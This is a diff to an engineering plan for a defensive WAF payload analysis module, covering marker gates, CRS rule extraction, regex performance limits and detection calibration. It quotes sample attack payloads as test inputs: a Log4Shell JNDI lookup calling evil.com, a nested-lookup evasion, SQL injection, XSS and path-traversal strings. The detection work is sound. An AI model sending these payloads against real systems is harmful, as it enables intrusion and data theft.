@@ -1,8 +1,8 @@
 # Implementation Plan — WAF Payload Analysis
 
 Source briefing: *WAF Payload Analysis Module* (2026-08-08).
-Companions: [`process_analyzer_plan.md`](process_analyzer_plan.md) and
-[`cmdline_analyzer_plan.md`](cmdline_analyzer_plan.md) — the two sibling modules,
+Companions: [`process_analyzer.md`](process_analyzer.md) and
+[`cmdline_analyzer.md`](cmdline_analyzer.md) — the two sibling modules,
 both already shipped. This document translates the briefing into concrete changes
 against the current codebase, records every decision it left open, and states
 seven deliberate deviations from it.
@@ -62,7 +62,7 @@ which is sufficient:
    yields `pylibinjection-0.2.4.tar.gz` containing `src/pylibinjection.pyx` and a
    bundled C submodule. Installing it requires a C toolchain (MSVC Build Tools on
    Windows). [`requirements.txt`](../requirements.txt) is four pure-Python lines,
-   and [`cmdline_analyzer_plan.md`](cmdline_analyzer_plan.md) D1 already rejected
+   and [`cmdline_analyzer.md`](cmdline_analyzer.md) D1 already rejected
    a dependency on exactly this portability ground. Reversing that for this
    module would be inconsistent.
 2. **No XSS support at all.** The bundled submodule ships only
@@ -212,6 +212,46 @@ attack-characteristic markers, the line is not treated as a WAF payload.
 This is a deliberate under-reach. Promoting the fallback later is cheap and can
 be decided on real usage; unpicking a misclassified URL corpus is not.
 
+**The briefing's marker list is wrong and is corrected here (found in A2).**
+§2.1 step 3 lists only URL-encoding, HTML/script, SQL characters and path
+traversal. Check that against the briefing's own worked example, one section
+earlier:
+
+```
+/api/data | ${jndi:ldap://evil.com/a}
+```
+
+`${jndi:ldap://evil.com/a}` contains no percent sequence, no angle bracket, no
+quote, no `--`, no `;` and no `../`. The briefing's gate **rejects Log4Shell** —
+the flagship case for the entire CVE fingerprint layer — before analysis begins,
+and the module would have shipped unable to detect the one payload every reader
+would test it with first.
+
+Three marker groups are added, and the Log4Shell string is pinned as a
+regression test in `test_waf_payload_parser.py`:
+
+| Marker | Pattern | Covers |
+|---|---|---|
+| `expression-injection` | `[$#%]\{` | Log4Shell (JNDI), Spring EL, OGNL |
+| `command-substitution` | `\$\(` or backtick | shell injection without `;` |
+| `null-byte` | `%00` or a literal NUL | extension-check bypass |
+
+One marker is also **tightened**: the briefing reads a bare `%` as a URL-encoding
+marker, which classifies `CPU | 95% load average` as a payload. It requires
+`%XX` here.
+
+Two consequences worth stating, both pinned by tests:
+
+- An **encoded** traversal payload (`%2e%2e%2fetc%2fpasswd`) fires
+  `url-encoding`, not `path-traversal` — the literal `../` only exists after the
+  Layer 1 decode, which runs downstream of this gate. The encoding marker admits
+  the line, which is sufficient; the gate does not need to be right about *which*
+  attack it is.
+- An **empty payload** after splitting is kept rather than refused. The
+  delimiter is the analyst stating intent, and returning "not a WAF payload"
+  would make `parse_iocs` discard the line silently (D6). It reaches the
+  analyzer and surfaces as `Unknown` per §4 rule 6.
+
 ### D6 — WAF payloads must be routed out of the IOC pipeline. Highest-risk step.
 
 [`summarize_results`](../ioc/verdict.py#L47) iterates **every** entry in `items`,
@@ -310,7 +350,7 @@ proof of an attack — the same call the cmdline module made for
 ### D9 — `Benign` is never returned. Deviation from briefing §5.5.
 
 Briefing §5.5 routes "nothing matched anywhere" to `Benign`. Both sibling modules
-refuse to ([`cmdline_analyzer_plan.md`](cmdline_analyzer_plan.md) D10), and
+refuse to ([`cmdline_analyzer.md`](cmdline_analyzer.md) D10), and
 [`ioc/verdict.py:169`](../ioc/verdict.py#L169) hardcodes `summary["benign"] = 0`
 for the whole app.
 
@@ -511,24 +551,81 @@ thresholds in B and C are tuned against observed behaviour instead of guessed.
 
 ### Milestone A — parse, decode, display
 
-| # | Step | Depends on |
-|---|---|---|
-| A1 | `decode_common.py` extraction; cmdline tests pass unmodified (D2) | — |
-| A2 | `waf_payload_parser.py` — split, validation gate, tests (D5) | — |
-| A3 | `ioc/parser.py` detection + `app.py` partition (D5, D6) | A2 |
-| A4 | Result object, `to_rows`, `WAF_ENCODED_PAYLOAD` flag, JSON block | A1, A3 |
+| # | Step | Depends on | Status |
+|---|---|---|---|
+| A1 | `decode_common.py` extraction; cmdline tests pass unmodified (D2) | — | **done** |
+| A2 | `waf_payload_parser.py` — split, validation gate, tests (D5) | — | **done** |
+| A3 | `ioc/parser.py` detection + `app.py` partition (D5, D6) | A2 | **done** |
+| A4 | Result object, `to_rows`, `WAF_ENCODED_PAYLOAD` flag, JSON block | A1, A3 | **done** |
 
 Ships a working decode-and-display path: paste a payload, see it decoded with its
 chain, get an `Unknown` verdict. Useful on its own — decoding is the step
 analysts do by hand today.
 
+**A1 notes.** The extraction cost the command-line module nothing: its suite
+passed unmodified and its calibration held at 30/30 detection, 0% false
+positives. One pre-existing defect surfaced and is recorded in §7 (the UTF-16LE
+fallback rescuing low-byte binary). `generic_transforms()` was written and then
+removed — with only one consumer it was dead code, and composing the transform
+tuple explicitly in each module keeps the ordering visible where it is used.
+
+**A3 notes.** Two things D6 asserts are now tested rather than assumed: that a
+payload never reaches `summarize_results`, and that its type resolves to no
+provider group. The second is currently true by omission, so the test reads
+`app.py`'s source — crude, but it fails loudly if someone adds a mapping without
+revisiting D6.
+
+Two integration decisions were forced by running real batches through
+`parse_iocs`, neither anticipated in this document:
+
+- **`waf_payload` is exempt from the manual-mode type filter.** That filter is
+  driven by the IOC-group checkboxes, which exist to stop unwanted provider
+  calls. A payload makes none and has no checkbox, so filtering it there would
+  drop the line with no way to opt back in.
+- **The empty-payload branch (D5) was unreachable as first written.**
+  `parse_iocs` strips every line before typing it, so `"/login?user= | "` arrives
+  as `"/login?user= |"` and the space-pipe-space match fails. The unit test
+  passed on input the app could never produce. The parser now also accepts the
+  stripped trailing form, and an integration test covers the path end to end —
+  the general lesson being that a unit test for this module proves nothing about
+  reachability until a batch has gone through `parse_iocs`.
+
+**A4 notes.** Milestone A is complete and reaches the UI: table row, JSON block,
+flag, and AI narrative context.
+
+Two decisions were added to what this document specified:
+
+- **`checks_skipped`, not an empty `crs_matches`.** The result object carries the
+  CRS and CVE fields from Milestone A so the JSON shape stays stable across
+  milestones — but an empty `crs_matches` reads as "CRS ran and found nothing",
+  which is exactly the false reassurance §5 is written against. Every result now
+  lists the checks that did not run, reusing the convention the process module
+  established, and the AI prompt states outright that `Unknown` here means
+  matching is unimplemented rather than assessed-and-cleared.
+- **No `aggregate_verdict()` function yet.** §4 rules 1-4 all read the CRS and
+  CVE layers, so at this milestone only rules 5 and 6 are reachable and both
+  resolve to `Unknown`. Writing the full ladder now would mean branches no test
+  could exercise against fields nothing can populate; the verdict is set inline
+  with a comment, and the ladder lands with the layers that feed it in B2.
+
+`WEB_PROFILE.min_b64_inline = 20` is the one uncalibrated number introduced here.
+It is safe to be wrong about in Milestone A — nothing escalates a verdict, so a
+bad decode shows the analyst noise with its provenance attached rather than
+manufacturing a finding — but it needs measuring against the Milestone C corpus.
+
+A canonical `mitre_url()` now lives in [`ioc/flags/base.py`](../ioc/flags/base.py),
+which already owns `_flag()`. `core/process_analyzer.py` and
+`core/cmdline_analyzer.py` each carry a byte-identical private copy; folding
+those two into it was deliberately left out of this change so the shipped
+modules stayed untouched, and is a clean standalone follow-up.
+
 ### Milestone B — CRS matching
 
-| # | Step | Depends on |
-|---|---|---|
-| B1 | `extract_crs_patterns.py` + `crs_patterns.json` (D3) | — |
-| B2 | Category matching + anomaly score, displayed, **not escalating** | A4, B1 |
-| B3 | Category flags + `_WAF_EVIDENCE` map (D8) | B2 |
+| # | Step | Depends on | Status |
+|---|---|---|---|
+| B1 | `extract_crs_patterns.py` + `crs_patterns.json` (D3) | — | **done** |
+| B2 | Category matching + anomaly score, displayed, **not escalating** | A4, B1 | **done** |
+| B3 | Category flags + `_WAF_EVIDENCE` map (D8) | B2 | — |
 
 B1 is the largest single piece of work and its uncertainty is concentrated in the
 `dropped_conditions` count: if a large share of the target rule ranges drop out
@@ -536,13 +633,158 @@ to `@detectSQLi`, `@pmFromFile` or PCRE incompatibility, the layer's coverage is
 materially thinner than the briefing assumes. **Measure and report that number
 before building B2** — it may change the plan.
 
+#### B1 measured yield (CRS 4.29.0-dev, 2026-08-11)
+
+> **Corrected during B2.** The first version of this section reported 197 rules
+> and a 98% yield. That figure was wrong: the extractor was emitting the *head*
+> of every chained rule as though it were a complete rule. Chained rules are now
+> dropped, and the corrected numbers are below. The defect and how it surfaced
+> are written up under B2.
+
+**The plan does not change. D1 holds.**
+
+291 `SecRule` statements across the eight target files:
+
+| Outcome | Count | Note |
+|---|---|---|
+| Extracted as regex | 171 | |
+| Extracted as phrase lists | 12 | `@pmFromFile` / `@pm` |
+| Skipped — control flow | 66 | paranoia gating, `skipAfter`; never detection |
+| Skipped — chain continuation | 14 | sub-rules of a dropped chain |
+| Skipped — non-pattern operator | 3 | `@gt` ×2, `@contains` ×1 |
+| **Dropped — chained rule** | **21** | head pattern is a precondition, not a detection |
+| **Dropped — libinjection** | **4** | `@detectSQLi` ×2, `@detectXSS` ×2 |
+| Dropped — uncompilable | **0** | |
+
+**183 of the 211 extractable detection rules survive — 87%.** The capability
+loss is 21 chained rules plus the 4 libinjection rules D1 already accounted for.
+
+By category: `sqli` 53, `rce` 42, `xss` 29, `php` 20, `protocol` 15, `ssrf` 14,
+`lfi` 6, `rfi` 4.
+
+**D1's load-bearing assumption is confirmed by measurement.** Dropping
+libinjection costs 4 rules and buys 88 regex-based SQLi and XSS rules that the
+briefing's plan would have skipped. The trade is far better than D1 claimed
+when it was written on argument alone.
+
+**Two rule files were added to D3's list** — `931` (RFI) and `934` (SSRF). Both
+are named in briefing §3 Layer 3; D3's shorter range list dropped them, which
+looks like an oversight rather than a decision. They contribute 19 rules.
+
+**PCRE translation: 9 patterns needed it, all 9 recovered, 0 dropped.** This is
+where the milestone nearly went wrong. Eight patterns fail Python's `re` on
+`\x{hh}` and one on `\z`, and the obvious fix — padding the bare `\x` to `\x00`
+— **compiles cleanly and silently changes what the rule matches**: `\x{bc}`
+becomes `\x00{bc}`, and rule 941310 stops matching the `¼`-obfuscated tag it
+exists to catch. The correct translation (`\x{bc}` → `\xbc`) is in
+`pcre_to_python`, and a test asserts both that it matches and that the naive
+version does not, so the trap cannot be walked into again.
+
+#### The real gap is transformations, not extraction
+
+74 of 197 rules carry a non-empty `dropped_conditions`:
+
+| Cause | Rules |
+|---|---|
+| Unsupported transformation | 61 |
+| Target mismatch (headers/cookies only) | 16 |
+
+Broken down, the transformations CRS asks for and Layer 1 does not do: `jsDecode`
+28, `cssDecode` 20, `cmdLine` 13, `replaceComments` 9, `removeWhitespace` 8,
+`escapeSeqDecode` 7, `removeCommentsChar` 1.
+
+These rules will **under-match** until B2 addresses them — an XSS rule expecting
+JavaScript escapes decoded will miss a payload that uses them. That is the
+honest state of the layer, and it concentrates in exactly the two categories D1
+made CRS responsible for.
+
+Most are cheap: `removeWhitespace`, `replaceComments` and `escapeSeqDecode` are
+small pure functions, and `cmdLine` is a documented ModSecurity normalisation.
+`jsDecode` and `cssDecode` are the two worth real care. **B2 should implement the
+transformation chain before tuning any threshold** — measuring an anomaly score
+against rules that are under-matching by construction would calibrate to the
+wrong number.
+
+#### B2 notes
+
+All 18 transformations the rule set asks for are implemented in
+[`core/crs_transforms.py`](../core/crs_transforms.py), so no extracted rule is
+now matched against text it did not expect. Matching lives in
+[`core/crs_matcher.py`](../core/crs_matcher.py) rather than inside the analyzer —
+a deviation from §2's file layout, made because the loader, the transformation
+cache and the scan loop are a unit with their own test surface, exactly as the
+command-line tokenizer was.
+
+**The transformations are not built on `decode_common`, on purpose.** The two
+modules have opposite obligations: `decode_common` refuses to percent-decode a
+lone `%27` and skips named HTML entities, because those heuristics protect the
+command-line module from corrupting `%SystemRoot%` and `dir&copy a b`.
+ModSecurity has no such reservations. Reusing the gated versions would have
+under-transformed silently — the same failure the missing transformations
+already caused.
+
+**The chained-rule defect.** Three benign strings were scoring during the first
+smoke test, and `report q3` was one of them. The cause was CRS rule 932205,
+whose own pattern is `^[^#]+` against the Referer header — it matches nearly any
+string, because it is the *head of a chain* whose real detection lives in the
+indented sub-rules that follow. B1's probe had reported "0 chained rules", which
+was itself wrong: it tested `"chain" in actions.split(",")`, and continuation
+folding leaves the token as `" chain"` with a leading space. 21 rules were
+affected. They are now dropped and counted, per D3's standing preference for a
+counted drop over a confident mistranslation, and a test asserts 932205 never
+reappears in the rule set.
+
+**Payloads are matched against both their raw and decoded forms.** In a live
+ModSecurity the `ARGS` collection is already URL-decoded before rules see it;
+163 of the extracted rules target `ARGS`, and 47 declare no transformation at
+all, so those 47 would be blind to every encoded payload if only the raw text
+were scanned. Each match records which form produced it, which is the provenance
+Milestone C needs to judge whether the decoded pass earns its place.
+
+**A denial-of-service bound was measured, not guessed.** `MAX_SCAN_LEN` began at
+100 kB and a single long payload froze the test run. Match cost is roughly
+quadratic in length — 1 kB in ~78 ms, 4 kB in ~514 ms, 20 kB in ~13 s — and
+profiling put **88% of it in three rules** (932390, 941140, 932290) that
+backtrack badly on long low-entropy input. Python's `re` has no per-match
+timeout, so a length bound is the only mitigation short of a different engine.
+The cap is now 2 kB, which keeps a 20-line batch near 3.6 s while covering real
+payloads comfortably, and truncation is surfaced through `checks_skipped` rather
+than being silent.
+
+#### Following CRS's own PL1 default would break this module
+
+The instinct on reading "paranoia levels" is to match only PL1, as a default CRS
+deployment does. Measured, that is wrong here:
+
+| Payload | All levels | PL1 only |
+|---|---|---|
+| `' OR '1'='1` | 36 | **0** |
+| `id=1 UNION SELECT password FROM users--` | 26 | 10 |
+| `<script>alert(1)</script>` | 31 | 15 |
+| `../../../../etc/passwd` | 48 | 20 |
+| `SELECT * FROM menu` (benign) | 0 | 0 |
+| `50% off -- limited time` (benign) | 9 | 0 |
+
+The most canonical SQLi payload there is scores **nothing** at PL1. A live CRS
+sees the whole HTTP request and still has its chained rules; this module sees one
+payload fragment and dropped the chains, so PL1 coverage is thinner here than it
+is there. The headline score therefore counts every level, `anomaly_score_pl1` is
+carried alongside for calibration context, and a test pins the finding so that
+nobody "fixes" the module to respect the CRS default and silences it on the first
+payload an analyst tries.
+
+**Separation, as measured:** attacks 26-48, benign 0-9. That is the room a
+Milestone C threshold has to work with, and a test asserts the gap rather than
+asserting any particular number.
+
 ### Milestone C — CVE fingerprints and calibration
 
-| # | Step | Depends on |
-|---|---|---|
-| C1 | `cve_fingerprints.json` — Log4Shell, Spring4Shell, ProxyShell (D10) | — |
-| C2 | `fetch_cve_by_id()` in `cve_panel.py` + KEV cross-reference (D4) | C1 |
-| C3 | Calibration corpus, then set the anomaly threshold and enable escalation | B3, C2 |
+| # | Step | Depends on | Status |
+|---|---|---|---|
+| B3 | Category flags + `_WAF_EVIDENCE` map (D8) | B2 | **done** |
+| C1 | `cve_fingerprints.json` — Log4Shell, Spring4Shell, ProxyShell (D10) | — | **done** |
+| C2 | `fetch_cve_by_id()` in `cve_panel.py` + KEV cross-reference (D4) | C1 | **done** |
+| C3 | Calibration corpus, then set the anomaly threshold and enable escalation | B3, C2 | **done** |
 
 C3 is the point of the whole sequence. The corpus needs both halves, and the
 second matters more:
@@ -555,8 +797,78 @@ second matters more:
   rate, and the threshold is chosen to satisfy it.
 
 Both sibling modules found real defects at their calibration step
-([`process_analyzer_plan.md`](process_analyzer_plan.md) §8). Budget for the same
+([`process_analyzer.md`](process_analyzer.md) §8). Budget for the same
 here.
+
+#### C3 calibration results (2026-08-11)
+
+Corpus: 28 known-bad, 20 known-good, in
+[`tests/fixtures/waf_corpus.json`](../tests/fixtures/waf_corpus.json).
+
+| Measure | Result |
+|---|---|
+| Known-bad reaching Suspicious or Malicious | **28 / 28** |
+| Known-good reaching **Malicious** | **0 / 20** |
+| Known-good reaching Suspicious | 4 / 20 (20%) |
+| Curated CVE payloads tripping their fingerprint | 7 / 8 |
+
+**The corpus found three real defects before it found a threshold.** That is
+what it was for.
+
+**1. §4 rule 2 was letting CRS corroborate itself.** The briefing escalates a
+lexical match to `Malicious` when "the anomaly score also crosses a threshold" —
+written when libinjection (Layer 2) and CRS (Layer 3) were separate engines. D1
+merged them, so the condition quietly became *CRS agreeing with CRS*: one layer
+voting twice. Implemented literally it called an ordinary JSON body `Malicious`
+at a score of 45, along with a shared code snippet and a CSV parameter list.
+
+The fix is to require corroboration from a layer that is not CRS — Layer 1 saw
+the payload arrive encoded, or Layer 4 recognised a CVE. This is a **deviation
+from briefing §5.2**, forced by D1, and it is the single change that took the
+false-`Malicious` rate from 15% to zero.
+
+**2. Decisions must use the PL1+PL2 score, not the full one.** CRS's PL3 and PL4
+rules are largely punctuation counters — "more than N special characters in this
+argument". Measured, they put benign text *above* several real attacks:
+
+| Payload | Full score | PL1+PL2 |
+|---|---|---|
+| `{"title":"Q3 report","tags":[…]}` (benign) | 45 | 18 |
+| `if (a < b && c > d) { return 1; }` (benign) | 32 | 20 |
+| `50% off -- limited time` (benign) | 9 | **0** |
+| `1 AND SLEEP(5)` (attack) | 28 | 20 |
+| `${jndi:ldap://…}` (attack) | 26 | 20 |
+
+No threshold placed on the full score can separate those halves. On PL1+PL2,
+four benign lines fall to exactly zero. A test pins the fact that the full score
+*fails* to separate, so nobody simplifies back to it.
+
+**3. The validation gate was refusing five corpus attacks**, including
+Spring4Shell — a curated CVE fingerprint, the one layer allowed to return
+`Malicious` unaided, being thrown away before Layer 4 ever ran. See D5, where
+the marker list is now twice its briefing size and the reasoning is recorded.
+
+**The threshold is 5.0 on the PL1+PL2 score** — one CRS rule at its own CRITICAL
+weight, the smallest signal that is not punctuation noise.
+
+**The 20% Suspicious false-positive rate is real and was not optimised away.**
+The four lines are a code snippet, a JSON body, a CSV parameter list and
+`../shared/reports` in a file manager. A live WAF at PL2 flags all four, which
+is why they are in the corpus. Raising the threshold to 20 would clear three of
+them and simultaneously drop `rce_backtick`, `xss_svg_onload` and
+`lfi_php_wrapper` to `Unknown`. That trade was measured and **rejected**: this
+module never returns `Benign`, so `Suspicious` and `Unknown` both mean "a human
+decides" and the only difference is whether the line draws attention — while a
+missed attack is simply missed. The hard requirement, asserted separately, is
+that the false-`Malicious` rate stays at zero.
+
+**One documented fingerprint gap.** `${${lower:j}ndi:${lower:l}dap://…}` — the
+nested-lookup Log4Shell evasion — does not trip its fingerprint, because Layer 1
+does not resolve Log4j lookups and the literal `jndi:` never appears. Writing a
+fuzzy pattern for it is exactly what the admission bar forbids, so it is left to
+CRS, which catches it at `Suspicious`. The corpus entry carries
+`expect_fingerprint: false` and a note; a separate test asserts that documented
+gaps still reach `Suspicious`, so a limitation cannot silently become a hole.
 
 ---
 
@@ -588,3 +900,15 @@ here.
 - **`decode_common.py` now has two consumers with different calibrations (D2).**
   A future change made for one module can silently degrade the other. The cmdline
   calibration suite is the guard; keep it in the same CI path as this module's.
+- **The UTF-16LE fallback rescues low-byte binary into plausible text (found in
+  A1).** An even-length run of low bytes is invalid as UTF-8 — control characters
+  fail the printable-ratio check — but reinterpreted as UTF-16LE it yields exotic
+  yet `str.isprintable()` code points, so `b64_decode_text` returns a "decode"
+  for what is actually binary. The command-line module is shielded downstream by
+  `b64_require_command_shape=True`; **a WAF payload cannot use that gate** (D2),
+  so this module is exposed where its sibling is not. Pinned as known behaviour
+  in `test_decode_common.py::test_known_gap_utf16_fallback_rescues_low_byte_binary`
+  and deliberately not fixed in A1, which was constrained to preserve the
+  shipped module's calibration exactly. Options for Milestone B, in preference
+  order: raise the printable-ratio bar for the no-shape case, or require the
+  decode to contain at least one ASCII character. Needs the corpus to choose.
